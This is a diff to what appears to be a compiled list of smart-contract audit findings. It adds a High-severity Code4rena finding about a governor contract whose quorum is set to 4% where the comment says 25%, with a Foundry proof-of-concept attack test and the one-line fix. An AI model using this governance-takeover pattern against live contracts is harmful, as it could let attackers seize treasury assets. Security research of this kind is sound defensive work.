@@ -496,7 +496,7 @@ Authors: [Evta](https://twitter.com/pwhattie), looking forward to your joining
 
 ```
 
-<details>
+</details>
 
 ## 7.[High] A successfully disputed redemption proposal has still increased the redemption fee base rate; exploit to depeg dUSD
 
@@ -675,6 +675,83 @@ function _vote(
             }
         }
 
+```
+
+</details>
+
+## 11.[High] Adversary can win proposals with voting power as low as 4%
+
+### Fails to set commented quorum
+
+- Summary:The TokenGovernor contract allows an attacker to execute governance proposals with only 4% of voting power, instead of the intended 25% quorum. The issue stems from the constructor parameter GovernorVotesQuorumFraction(4), which sets the quorum to 4/100 (4%) rather than 1/4 (25%) as commented.
+
+- Impact & Recommendation: While some argued this could be a documentation error (citing examples like Uniswap and Compound using 4% quorums), the judge maintained the high severity rating because AI tokens on Fraxtal are likely to have much smaller market caps than blue-chip DeFi protocols, making it significantly easier and cheaper for attackers to acquire 4% voting power. Additionally, since the TokenGovernor controls the Agent contract holding LP tokens, a malicious proposal passed with such a low quorum could have severe implications, especially if token prices increase significantly.
+  <br> 🐬: [Source](https://code4rena.com/reports/2025-01-iq-ai#h-01-adversary-can-win-proposals-with-voting-power-as-low-as-4) & [Report](https://code4rena.com/reports/2025-01-iq-ai)
+
+<details><summary>POC</summary>
+
+```solidity
+
+function test_AttackLowQuorumThreshold() public {
+
+    // Setup agent
+    factory.setAgentStage(address(agent), 1);
+
+    // Setup an attacker with 4% of voting power
+    // Transfer from the whale that has 37% of tokens
+    vm.startPrank(whale);
+    address attacker = makeAddr("attacker");
+    uint256 fourPercentSupply = token.totalSupply() * 4 / 100;
+    token.transfer(attacker, fourPercentSupply);
+
+    // Delegate attacker tokens to themselves
+    vm.startPrank(attacker);
+    token.delegate(attacker);
+
+    // Make a malicious proposal with 4% of votes (0.01% needed)
+    vm.warp(block.timestamp + 1);
+    address[] memory targets = new address[](1);
+    targets[0] = address(666);
+    uint256[] memory values = new uint256[](1);
+    bytes[] memory calldatas = new bytes[](1);
+    string memory description = "";
+    uint256 nonce = governor.propose(targets, values, calldatas, description);
+
+    // Cast vote with 4% voting power
+    vm.warp(block.timestamp + governor.votingDelay() + 1);
+    governor.castVote(nonce, 1);
+
+    // Warp to the end of the voting period
+    // It can be assessed that with a total votes of 100 Million, the quorum is only 4 Million
+    // The voting power of the attacker can be as low as 4 Million (4%)
+    vm.warp(block.timestamp + governor.votingPeriod());
+    console.log();
+    console.log("totalVotes:       ", token.getPastTotalSupply(block.timestamp - 1));
+    console.log("quorum:           ", governor.quorum(block.timestamp - 1));
+    console.log("votingPower:      ", governor.getVotes(attacker, block.timestamp - 1));
+
+    // The proposal succeeds with only 4% of voting power (lower than the expected 25% quorum)
+    governor.execute(targets, values, calldatas, keccak256(abi.encodePacked(description)));
+    console.log("ATTACK SUCCEEDED WITH ONLY 4% OF VOTES");
+    vm.stopPrank();
+}
+
+```
+
+```solidity
+    constructor(
+        string memory _name,
+        IVotes _token,
+        Agent _agent
+    )
+
+        Governor(_name)
+        GovernorVotes(_token)
+-       GovernorVotesQuorumFraction(4) // quorum is 25% (1/4th) of supply
++       GovernorVotesQuorumFraction(25) // quorum is 25% (1/4th) of supply
+    {
+        agent = _agent;
+    }
 ```
 
 </details>
